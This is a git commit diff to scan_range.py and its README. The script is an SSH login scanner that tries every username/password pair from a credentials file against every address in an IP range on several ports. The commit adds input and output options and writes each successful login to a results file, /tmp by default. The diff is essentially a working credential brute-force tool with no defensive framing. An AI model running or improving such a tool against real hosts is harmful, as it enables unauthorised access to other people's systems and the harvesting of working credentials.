b9c70ddd20fe9a3556d8b117f240ac0ac73d7e12
tux <tux@nunux>
2021-03-11 00:04:31 +0100

    fix

--- README.md
+++ README.md
@@ -14,5 +14,5 @@ examples:
 
     $ ./scan_from_file.py --file servers.txt --ports 22,8022,9022
     $ ./scan_from_file.py -f servers.txt -p 22,8022,9022
-    $ ./scan_range.py --file credentials.txt --ports 22,8022,9022 --range 123.44.55.0/30
-    $ ./scan_range.py -f credentials.txt -p 22,8022,9022 -r 123.44.55.0/30
+    $ ./scan_range.py --input credentials.txt --ports 22,8022,9022 --range 123.44.55.0/30 --output results.txt
+    $ ./scan_range.py -i credentials.txt -p 22,8022,9022 -r 123.44.55.0/30 -o results.txt
--- scan_range.py
+++ scan_range.py
@@ -12,21 +12,23 @@ def get_creds(f):
             x = line.split('|')
             yield x[0], x[1].strip()
 
+
 def get_ip(cidr):
     net = ip_network(cidr, strict=False)
     for ip in net:
-        yield ip
+        yield str(ip)
 
 
 def main(argv):
-    _file = None
+    in_file = None
+    out_file = '/tmp/ssh_scan_results.txt'
     ip_range = None
     ports = [22]  # default port list
     argc = len(sys.argv)
     i = 1
     while (i < argc):
-        if sys.argv[i] in ('-f', '--file'):
-            _file = sys.argv[i+1]
+        if sys.argv[i] in ('-i', '--input'):
+            in_file = sys.argv[i+1]
             i += 2
         elif sys.argv[i] in ('-p', '--port', '--ports'):
             ports = [int(p) for p in sys.argv[i+1].split(',')]
@@ -34,26 +36,31 @@ def main(argv):
         elif sys.argv[i] in ('-r', '--range'):
             ip_range = sys.argv[i+1]
             i += 2
+        elif sys.argv[i] in ('-o', '--output'):
+            out_file = sys.argv[i+1]
+            i += 2
         else:
-            print('Unknown arg: {sys.argv[i]}')
+            print(f'Unknown arg: {sys.argv[i]}')
             sys.exit(1)
 
-    if not (_file and ip_range):
+    if not (in_file and ip_range):
         print('Missing arg')
         sys.exit(1)
 
-    for proxy in get_ip(ip_range):
-        for user, password in get_creds(_file):
-            for port in ports:
-                try:
-                    ret = helper.try_login(proxy, port, user, password)
-                    if ret:
-                        print("{}:{}@{}:{} OK".format(user, password, proxy, port))
-                        break
-                    else:
-                        print("{}:{}@{}:{} ko".format(user, password, proxy, port))
-                except Exception as e:
-                    print("{}:{}@{}:{} ko".format(user, password, proxy, port))
+    with open(out_file, 'w+') as of:
+        for proxy in get_ip(ip_range):
+            for user, password in get_creds(in_file):
+                for port in ports:
+                    try:
+                        ret = helper.try_login(proxy, port, user, password)
+                        if ret:
+                            print(f"{user}:{password}@{proxy}:{port} OK")
+                            of.write(f"{user}:{password}@{proxy}:{port}")
+                            break
+                        else:
+                            print(f"{user}:{password}@{proxy}:{port} ko")
+                    except Exception as e:
+                        print(f"{user}:{password}@{proxy}:{port} ko")
 
 
 if __name__ == '__main__':
